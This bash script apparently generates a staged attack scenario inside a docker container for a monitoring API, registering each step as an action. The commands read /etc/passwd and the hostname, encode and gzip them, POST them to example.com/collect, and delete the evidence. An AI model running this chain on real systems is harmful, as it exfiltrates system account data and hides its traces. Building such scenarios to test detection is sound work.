#!/usr/bin/env bash
# Action 1: Write staging script
curl -s -X POST "$URL/containers/$CID/actions" \
    -H 'Content-Type: application/json' \
    -d '{"command":"write staging script"}'
sudo docker exec "$CONTAINER" sh -c 'cat > /tmp/stage.py << PYEOF
import os
with open("/etc/passwd") as f:
    data = f.read()
with open("/tmp/staged.txt", "w") as f:
    f.write(data)
hostname = os.popen("hostname").read().strip()
with open("/tmp/staged.txt", "a") as f:
    f.write(f"\\n# host: {hostname}\\n")
PYEOF
chmod +x /tmp/stage.py'
sleep 2
curl -s -X POST "$URL/containers/$CID/actions/1/end" > /dev/null

# Action 2: Execute staging script
curl -s -X POST "$URL/containers/$CID/actions" \
    -H 'Content-Type: application/json' \
    -d '{"command":"python3 /tmp/stage.py"}'
sudo docker exec "$CONTAINER" python3 /tmp/stage.py
sleep 3
curl -s -X POST "$URL/containers/$CID/actions/2/end" > /dev/null

# Action 3: Encode, exfiltrate, clean up
curl -s -X POST "$URL/containers/$CID/actions" \
    -H 'Content-Type: application/json' \
    -d '{"command":"encode and exfiltrate staged data"}'
sudo docker exec "$CONTAINER" sh -c '
    cat /tmp/staged.txt | base64 | gzip > /tmp/payload.gz
    curl -s -X POST --data-binary @/tmp/payload.gz http://example.com/collect > /dev/null 2>&1 || true
    rm -f /tmp/staged.txt /tmp/payload.gz /tmp/stage.py
'
sleep 3
curl -s -X POST "$URL/containers/$CID/actions/3/end" > /dev/null
